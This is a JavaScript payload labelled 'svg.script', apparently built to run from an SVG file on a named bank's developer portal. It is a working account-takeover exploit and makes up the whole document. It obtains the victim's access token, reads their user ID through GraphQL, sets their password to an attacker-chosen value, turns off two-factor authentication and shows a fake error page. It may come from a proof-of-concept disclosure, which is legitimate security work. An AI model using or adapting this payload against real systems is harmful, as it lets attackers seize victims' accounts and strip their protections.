svg.script:



async function sendData() {
    // Try to get valid JWT token
    let accessToken;
    try {
        const response = await fetch('https://developer.bankid.cz/api/keycloak/access-token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();
        console.log("Request complete:", data);
        accessToken = data.accessToken;
    } catch (error) {
        console.log("[ERR] Unable to fetch valid JWT -> create fake login page fallback");
        console.error("Error:", error);
    }

    console.log("[INF] 1# JWT obtained");

    // Now call graphQL to get userID

    let xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.bankid.cz/dev-portal-backend/graphql?query=query+Notifications%7bcurrentUser%7bid%7d%7d', false); 
    xhr.setRequestHeader('Authorization', 'Bearer ' + accessToken);
    xhr.send(null);

    let currentUser = null;

    if (xhr.status === 200) {
        let responseObj = JSON.parse(xhr.responseText);
        currentUser = responseObj.data.currentUser.id;
    }else{
        console.log("[ERR] Unable to obtain userID -> create fake login page");
    }

    console.log("[INF] UserID obtained");

    // Now change the password using GraphQL
    const resetPasswdMutation = '{"query":"mutation updateUsers($userId: ID!, $password: NewUserPasswordInput!) {  resetUserPassword(userId: $userId, password: $password)}","variables":{"userId":"placeholder","password":{"newPassword":"placeholder"}}}';
    const resetPasswdMutationJSON = JSON.parse(resetPasswdMutation);
    resetPasswdMutationJSON.variables.userId = currentUser;
    resetPasswdMutationJSON.variables.password.newPassword = "*H4CK3d*";

    xhr = new XMLHttpRequest();
    xhr.open("POST", "https://api.bankid.cz/dev-portal-backend/graphql", false);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("Authorization", "Bearer " + accessToken);

    var jsonBody = JSON.stringify(resetPasswdMutationJSON);
    xhr.send(jsonBody);

    if (xhr.status === 200 || xhr.status === 201) {
        console.log("[INF] Response from the server:", JSON.parse(xhr.responseText));
    } else {
        console.error("[ERR]", xhr.status, xhr.statusText);
        return null;
    }

    // Now disable two factor authentication
    const disableUserTwoStepVerificationMutation = '{"query":"mutation setUserTwoStepVerification($enable: Boolean!){setUserTwoStepVerification(enable: $enable)}","variables":{"enable":false}}';
    xhr = new XMLHttpRequest();
    xhr.open("POST", "https://api.bankid.cz/dev-portal-backend/graphql", false);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("Authorization", "Bearer " + accessToken);
    xhr.send(disableUserTwoStepVerificationMutation);

    if (xhr.status === 200 || xhr.status === 201) {
        console.log("[INF] Response from the server:", JSON.parse(xhr.responseText));
    } else {
        console.error("[ERR]", xhr.status, xhr.statusText);
        return null;
    }

    // Now display fake error page

    document.write(atob(''));



}

sendData();
